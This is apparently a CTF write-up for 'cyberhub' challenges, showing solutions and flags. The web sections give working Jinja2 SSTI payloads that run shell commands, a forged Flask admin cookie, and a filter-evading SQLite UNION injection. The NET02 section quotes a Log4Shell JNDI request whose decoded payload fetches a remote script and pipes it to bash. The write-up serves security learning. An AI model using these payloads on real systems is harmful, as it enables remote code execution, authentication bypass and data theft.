## Welcome 
![](https://i.imgur.com/4gooC7G.png)

>cyberhub_{hello&welcome2Discord}

----

## Authy - WEB 1
![](https://i.imgur.com/eMus9Sj.png)

we saw a login page source code that contained base64 encoded creds
![](https://i.imgur.com/IwIb99f.png)



```
<script>
        function makeLogin(){var _0x5a12f9=document['getElementById']('login')['value'],_0x11607b=document['getElementById']('password')['value'];_0x5a12f9['length']>0x0&&_0x11607b['length']>0x0?_0x5a12f9==atob('d2ViX2FkbWlu')&&_0x11607b==atob('c3VwZXJfc2VjdXJlX3Bhc3N3b3JkXzEzMzchISE=')?alert(atob('Q29uZ3JhdHVsYXRpb25zISBUaGUgZmxhZyBpcyBjeWJlcmh1Yl97Y2xpZW50X2F1dGhfaXNfbm90X3NlY3VyZX0=')):alert('Incorrect\x20username\x20or\x20password!'):alert('Username\x20or\x20password\x20cannot\x20be\x20empty!');}
    </script>
```

>cyberhub_{client_auth_is_not_secure}

---

## Health Card - WEB 2

![](https://i.imgur.com/Bv6f5z9.png)

after trying multiple things like OPTIONS turns out i cant GET but the solution was not in there...

![](https://i.imgur.com/GFQa5oS.png)

i tried XSS but no results so then i tried SSTI and it worked on one of the feilds.

![](https://i.imgur.com/6Jux8j9.png)

used this as a reference: https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
```
firstName=&lastName=&info={{ config.items() }}
firstName=&lastName=&info={{ ''.__class__.__mro__[1].__subclasses__() }} 
firstName=&lastName=&info={{‘’.__class__.__mro__[1].__subclasses__()[284:]}}
firstName=&lastName=&info={{''.__class__.__mro__[1].__subclasses__()[283]('ls',shell=True,stdout=-1).communicate()}}
firstName=&lastName=&info={{''.__class__.__mro__[1].__subclasses__()[283]('cat ../opt/flag.txt',shell=True,stdout=-1).communicate()}}
```
![](https://i.imgur.com/vzSkoUC.png)


>cyberhub_{VaccineGoodInjectionSSTIBadInjection}

---

## Public Secrets - WEB 3

![](https://i.imgur.com/nSk1ZZ6.png)

http://web.cyberhubchallenges.com:8030/api/getResource?resource=bee_movie.txt

the above URL has "resource=" so lets try some fun stuff

checking the error, there seems to be a main.py file that we should take a look at.

reference:http://www.pranav-venkat.com/2021/03/malcrove-playsecure-ctf-easy-web-challenge-writeup.html

tool: https://github.com/noraj/flask-session-cookie-manager
```
python3 flask_session_cookie_manager3.py encode -s 'SecureUncrackablePassword' -t '{"type":"admin"}'
    eyJ0eXBlIjoiYWRtaW4ifQ.YgZU-w.4xmGppYUvIVEOBuNlN6QcWu2xGA
```

![](https://i.imgur.com/mZrFuoc.png)

>cyberhub_{EncryptedCookiesAreNoMatchForLFI}

---

## Super Safe Employee Portal - WEB 4

by passing a ' we got an SQLite error! 
![](https://i.imgur.com/FnYokLm.png)
![](https://i.imgur.com/xhoszdR.png)
![](https://i.imgur.com/SZwgfgn.png)

reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

so it seems it doesnt accept " " space so we can use instead "/**/" which is a comment
![](https://i.imgur.com/Q1xxE5j.png)
![](https://i.imgur.com/0pXV24p.png)

we just need to keep the number oc colum selected is equal to what our query has
```
GET /?q=admin'union/**/SELECT/**/sql,'1','2'/**/FROM/**/sqlite_master;
```
![](https://i.imgur.com/nlWPiFg.png)
![](https://i.imgur.com/kOIeXLO.png)

>cyberhub_{EvadingFiltersAndDumpingDataIsTruly1337}

---

---

## Programming 1

![](https://i.imgur.com/1co4qYi.png)

![](https://i.imgur.com/XE4vA5n.png)

>cyberhub_{QCCARFBGLPJJ}

---

## Programming 2

![](https://i.imgur.com/a610Bk9.png)

![](https://i.imgur.com/j0SsHu5.png)

>cyberhub_{MJPMZQAQRFRF}

---

## Programmming 4

![](https://i.imgur.com/XE6YtJx.png)

![](https://i.imgur.com/mwbGYG7.png)

https://stackoverflow.com/questions/29064189/maximum-and-minimum-number-from-a-file-in-c

>cyberhub_{JJHJACZARGVT}

---

## 64's 
![](https://i.imgur.com/3jFJ4ch.png)
![](https://i.imgur.com/cd3sWMp.png)

>cyberhub_{39a43213c13501e46d5eeee6190759a3}

---
## NET01

![](https://i.imgur.com/1qyuxOb.png)
![](https://i.imgur.com/25W21lj.png)
only one from port 80
![](https://i.imgur.com/z09vflO.png)
![](https://i.imgur.com/LWYbB3F.png)

![](https://i.imgur.com/17Y2FZg.png)
jpg ends with 'FF D9' and this seems the reverse 'mirror' of it

![](https://i.imgur.com/hlgxH1w.png)
and starts with 'FF D8 FF E0 00 10 4A 46 49 46 00 01' and also this is the 'mirror' of it

![](https://i.imgur.com/Wa6lLkq.png)
![](https://i.imgur.com/TH6KXjw.png)
>cyberhub_{ba71f5ad35cb194dbc744c360557109b}

---

## NET02

![](https://i.imgur.com/8CIeM1Z.png)
LOG4J!


ip contains jndi
![](https://i.imgur.com/w8pxK33.png)
```
GET //?x=${jndi:ldap://114.25.32.15:3369/Basic/Command/Base64/KGN1cmwgLXMgaHR0cHM6Ly9tZWdhLm56L2ZpbGUva1VrMEVMeEwjZXdhRGlFUGctUjVMSHl3eER5Uk56WmFWS2tYU0xHX3BDWTlZRUFacHkwNC8yMC4xMS4wLjQ2OjgwfHx3Z2V0IC1xIC1PLSBodHRwczovL21lZ2EubnovZmlsZS9rVWswRUx4TCNld2FEaUVQZy1SNUxIeXd4RHlSTnpaYVZLa1hTTEdfcENZOVlFQVpweTA0LzIwLjExLjAuNDY6ODApfGJhc2g= HTTP/1.0
Host: HelloCyberHub.com
```
from base64
```
(curl -s https://mega.nz/file/kUk0ELxL#ewaDiEPg-R5LHywxDyRNzZaVKkXSLG_pCY9YEAZpy04/20.11.0.46:80||wget -q -O- https://mega.nz/file/kUk0ELxL#ewaDiEPg-R5LHywxDyRNzZaVKkXSLG_pCY9YEAZpy04/20.11.0.46:80)|bash
```
![](https://i.imgur.com/vCXeRcT.png)

https://www.cvedetails.com/cve/CVE-2022-23302/ CVE

>cyberhub_{123_CVE-2021-44228_...-..._AndLoveScapy}

